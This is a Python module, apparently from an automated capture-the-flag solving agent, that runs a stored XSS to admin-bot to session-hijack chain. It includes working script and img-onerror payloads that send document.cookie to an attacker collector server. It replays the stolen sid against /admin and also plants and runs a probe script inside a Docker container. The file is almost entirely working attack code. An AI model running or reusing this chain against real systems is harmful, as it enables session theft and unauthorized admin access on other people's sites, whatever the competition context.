"""Stored-XSS / visit-url / docker-loopback collector chain, extracted from ctf_dispatcher.

Twentieth P5 cut: a physically-contiguous, self-contained cluster (originally
ctf_dispatcher lines 2281-2567) that drives the external/loopback collector
callback exploit chain — stored XSS -> /visit -> sid -> /admin, plus the docker
loopback fallback. Methods are pure relocations; ``self.*`` resolves at runtime
via the dispatcher's MRO, so call sites are unchanged.
"""

from __future__ import annotations

import tempfile
import uuid
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urljoin, urlparse

from .chains.base import _ChainOutcome
from .collector_server import _CollectorServer
from .dispatcher_helpers import (
    _command_output_text,
    _docker_loopback_probe_cleanup_command,
    _docker_loopback_probe_copy_command,
    _docker_loopback_probe_read_command,
    _docker_loopback_probe_script,
    _docker_loopback_probe_start_command,
    _extract_sid_from_collector_log,
    _extract_sid_from_text,
    _is_loopback_base,
    _pick_form_field,
    _target_port,
)


class XSSCollectorChainMixin:
    """Stored-XSS and visit-url collector callback exploit chain."""

    async def _attempt_stored_xss_chain(
        self,
        base: str,
        auth_form: dict[str, Any],
        writable_field: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        login_url = str(auth_form.get("action") or urljoin(base + "/", "login"))
        visit_url = urljoin(base + "/", "visit")
        collector = _CollectorServer(base, port=self.collector_port)
        await collector.start()
        self._emit(f"[CTF dispatcher] collector listening at {collector.base_url}")

        try:
            username_field = _pick_form_field(auth_form, "username") or "username"
            password_field = _pick_form_field(auth_form, "password") or "password"
            payload_builders = [
                lambda c: f"<script>new Image().src='{c}/c?sid='+encodeURIComponent(document.cookie)</script>",
                lambda c: f"<img src=x onerror=\"new Image().src='{c}/c?sid='+encodeURIComponent(document.cookie)\">",
            ]

            for idx, builder in enumerate(payload_builders, start=1):
                payload = builder(collector.base_url)
                body = {
                    username_field: f"ctf_user_{idx}",
                    password_field: "ctf_pass_123",
                    writable_field: payload,
                }
                resp = await self.runtime.proxy_action(
                    "post",
                    url=login_url,
                    data=body,
                    timeout=15,
                )
                await self._scan_and_store(
                    str(resp.get("body") or ""),
                    base,
                    evidence_source="http-response",
                )
                progress = True
                self._emit(f"[CTF dispatcher] stored XSS payload attempt #{idx} submitted")

                await self.runtime.proxy_action("request", method="POST", url=visit_url, timeout=15)
                hit = await collector.wait_for_hit(timeout=6.0)
                if not hit:
                    reasons = "first failed" if idx == 1 else "second failed"
                    await self._store_note(
                        key="ctf_xss_attempts",
                        value=reasons,
                        category="finding",
                        target=urlparse(base).netloc,
                    )
                    continue

                flag = await self._handle_collector_hit(base, hit)
                if flag:
                    if idx == 2:
                        await self._store_note(
                            key="ctf_xss_attempts",
                            value="first failed / second worked",
                            category="finding",
                            target=urlparse(base).netloc,
                        )
                        return _ChainOutcome(
                            progress=True,
                            flag=flag,
                            reason="stored XSS -> /visit -> sid -> /admin",
                        )
            return _ChainOutcome(progress=True, reason="stored XSS payloads exhausted")
        finally:
            await collector.stop()

    async def _attempt_visit_url_chain(self, base: str) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        if base in self._exhausted_visit_url_targets:
            return _ChainOutcome(progress=False, reason="visit-url already exhausted for target")
        visit_url = urljoin(base + "/", "visit")
        collector = _CollectorServer(base, port=self.collector_port)
        collector_started = False
        try:
            await collector.start()
            collector_started = True
        except OSError:
            docker_local = await self._attempt_docker_loopback_visit_chain(base)
            if docker_local.flag:
                return docker_local
            self._exhausted_visit_url_targets.add(base)
            return _ChainOutcome(progress=False, reason="visit-url modes exhausted")
        self._emit(f"[CTF dispatcher] external exploit collector at {collector.base_url}")
        try:
            for mode in ("A", "B", "C", "D"):
                exploit_url = collector.exploit_url(mode)
                self._emit(f"[CTF dispatcher] trying visit-url mode {mode}: {exploit_url}")
                await self.runtime.proxy_action(
                    "request",
                    method="POST",
                    url=visit_url,
                    json={"url": exploit_url},
                    timeout=15,
                )
                hit = await collector.wait_for_hit(timeout=6.0)
                if hit:
                    flag = await self._handle_collector_hit(base, hit)
                    if flag:
                        return _ChainOutcome(progress=True, flag=flag, reason=f"visit-url mode {mode}")
            docker_local = await self._attempt_docker_loopback_visit_chain(base)
            if docker_local.flag:
                return docker_local
            self._exhausted_visit_url_targets.add(base)
            return _ChainOutcome(progress=False, reason="visit-url modes exhausted")
        finally:
            if collector_started:
                await collector.stop()

    async def _attempt_docker_loopback_visit_chain(self, base: str) -> _ChainOutcome:
        if not _is_loopback_base(base):
            return _ChainOutcome(progress=False, reason="")

        container_name = await self._resolve_loopback_target_container(base)
        if not container_name:
            return _ChainOutcome(progress=False, reason="")

        visit_url = urljoin(base + "/", "visit")
        log_path = "/tmp/flaghunter_visit_collector.log"
        host_probe_path = Path(tempfile.gettempdir()) / f"flaghunter_visit_collector_{uuid.uuid4().hex}.js"
        try:
            host_probe_path.write_text(
                _docker_loopback_probe_script(
                    collector_port=self.collector_port,
                    log_path=log_path,
                ),
                encoding="utf-8",
            )
            copy_result = await self._runtime_execute_command(
                _docker_loopback_probe_copy_command(
                    host_probe_path=host_probe_path,
                    container_name=container_name,
                ),
                timeout=30,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "copy_probe"},
            )
            if not getattr(copy_result, "success", False):
                return _ChainOutcome(progress=False, reason="")
            start_result = await self._runtime_execute_command(
                _docker_loopback_probe_start_command(container_name=container_name),
                timeout=30,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "start_probe"},
            )
            if not getattr(start_result, "success", False):
                return _ChainOutcome(progress=False, reason="")
            await self._runtime_proxy_action(
                "request",
                method="POST",
                url=visit_url,
                json={"url": f"http://127.0.0.1:{self.collector_port}/"},
                timeout=15,
                audit_target=visit_url,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "trigger_visit"},
            )
            read_result = await self._runtime_execute_command(
                _docker_loopback_probe_read_command(
                    container_name=container_name,
                    log_path=log_path,
                ),
                timeout=15,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "read_probe"},
            )
            try:
                host_probe_path.unlink(missing_ok=True)
            except Exception:
                pass
            hit_text = _command_output_text(read_result)
            sid = _extract_sid_from_collector_log(hit_text)
            if not sid:
                return _ChainOutcome(progress=False, reason="")
            await self._store_secret_note("sid", sid, base)
            if self.state is not None:
                self.state.local_challenge_auto_verify = True
            flag = await self._fetch_admin_with_sid(base, sid)
            if flag:
                return _ChainOutcome(
                    progress=True,
                    flag=flag,
                    reason="docker localhost visit fallback",
                )
            return _ChainOutcome(progress=False, reason="")
        finally:
            await self._runtime_execute_command(
                _docker_loopback_probe_cleanup_command(
                    container_name=container_name,
                    log_path=log_path,
                ),
                timeout=15,
                audit_target=base,
                audit_metadata={"phase": "docker_loopback_visit", "stage": "cleanup_probe"},
            )

    async def _resolve_loopback_target_container(self, base: str) -> str | None:
        port = _target_port(base)
        result = await self._runtime_execute_command(
            'docker ps --format "{{.Names}}|{{.Ports}}"',
            timeout=20,
            audit_target=base,
            audit_metadata={"phase": "docker_loopback_visit", "stage": "resolve_container"},
        )
        blob = _command_output_text(result)
        if not blob:
            return None

        port_markers = (
            f":{port}->",
            f"0.0.0.0:{port}->",
            f"[::]:{port}->",
        )
        for raw_line in blob.splitlines():
            line = str(raw_line or "").strip()
            if not line or "|" not in line:
                continue
            name, _, ports = line.partition("|")
            if any(marker in ports for marker in port_markers):
                return name.strip() or None
        return None

    async def _handle_collector_hit(self, base: str, hit_path: str) -> str | None:
        self._emit(f"[CTF dispatcher] collector hit: {hit_path}")
        if flag := self._extract_flag(hit_path):
            verification = await self._observe_flag(
                flag,
                base,
                evidence_source="collector-hit",
                rationale="collector received callback content",
            )
            if verification.decision == "verified":
                return verification.flag

        sid = _extract_sid_from_text(hit_path)
        if sid:
            await self._store_secret_note("sid", sid, base)
            return await self._fetch_admin_with_sid(base, sid)

        parsed = urlparse(hit_path)
        params = parse_qs(parsed.query)
        for key in ("cookie", "body", "iframe", "flag", "err", "openErr", "iframeErr"):
            if key in params:
                text = params[key][0]
                if flag := self._extract_flag(text):
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source=f"collector-{key}",
                        rationale=f"collector callback via {key}",
                    )
                    if verification.decision == "verified":
                        return verification.flag
                sid = _extract_sid_from_text(text)
                if sid:
                    await self._store_secret_note("sid", sid, base)
                    return await self._fetch_admin_with_sid(base, sid)
        return None

    async def _fetch_admin_with_sid(self, base: str, sid: str) -> str | None:
        cookie_value = sid if "=" in sid else (sid if sid.startswith("sid=") else f"sid={sid}")
        admin_url = urljoin(base + "/", "admin")
        resp = await self._runtime_proxy_action(
            "request",
            method="GET",
            url=admin_url,
            headers={"Cookie": cookie_value},
            timeout=15,
            audit_target=admin_url,
            audit_metadata={"phase": "sid_replay"},
        )
        body = str(resp.get("body") or "")
        await self._scan_and_store(body, base, evidence_source="http-response")
        if flag := self._extract_flag(body):
            verification = await self._observe_flag(
                flag,
                base,
                evidence_source="http-response",
                rationale="admin endpoint response after sid replay",
            )
            if verification.decision == "verified":
                return verification.flag
        return None
